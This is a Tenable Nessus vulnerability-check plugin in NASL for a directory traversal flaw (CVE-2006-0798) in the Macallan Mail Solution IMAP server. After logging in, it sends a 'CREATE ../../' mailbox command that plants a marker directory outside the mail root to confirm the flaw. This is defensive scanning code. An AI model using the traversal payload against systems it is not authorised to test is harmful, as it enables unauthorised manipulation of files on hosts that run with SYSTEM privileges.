#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20936);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-0798");
  script_bugtraq_id(16704);
  script_osvdb_id(23269);

  script_name(english:"Macallan IMAP Server Multiple Traversals Arbitrary File/Directory Manipulation");
  script_summary(english:"Checks for a directory traversal vulnerability in Macallan");
 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by directory traversal
vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Macallan Mail Solution, a mail server for
Windows. 

The IMAP server bundled with the version of Macallan installed on the
remote host fails to filter directory traversal sequences from mailbox
names passed to the 'CREATE', 'DELETE, 'RENAME', and 'SELECT'
commands.  An authenticated attacker can exploit these issues to gain
access to sensitive information and more generally to manipulate
arbitrary directories on the affected host. 

Note that the software's IMAP server is part of the MCPop3 service,
which runs with LOCAL SYSTEM privileges." );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2006-4/advisory/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Macallan Mail Solution version 4.8.05.004 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/17");
 script_cvs_date("$Date: 2015/09/24 21:17:11 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencie("find_service1.nasl", "imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like Macallan's.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "* OK Greeting" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
#
# nb: SELECT seems to return OK regardless of whether the directory
#     actually exists in a vulnerable version. 
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  # Create a mailbox in the main directory for Macallan Mail Solutions.
  #
  # nb: Macallan happily creates any necessary parent directories.
  mailbox = string("NESSUS/", SCRIPT_NAME, "/", unixtime());
  c = string("nessus", string(tag), " CREATE ../../", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # There's a problem if we were successful; ie,
  # "nessus2 OK CREATE completed" vs "nessus2 NO - '..' is Not Allowed".
  if (resp && resp =~ "OK" && "CREATE completed" >< s) {
    if (report_verbosity > 0) {
      report = string(
        "Nessus was able to create the following directory on the remote\n",
        "host, under the directory in which Macallan is installed:\n",
        "\n",
        "  ", mailbox
      );
    }
    else report = NULL;

    security_warning(port:port, extra:report);
  }
}
else if (resp =~ "BAD" || resp =~ "NO") {
  debug_print("couldn't login with supplied imap credentials!", level:1);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
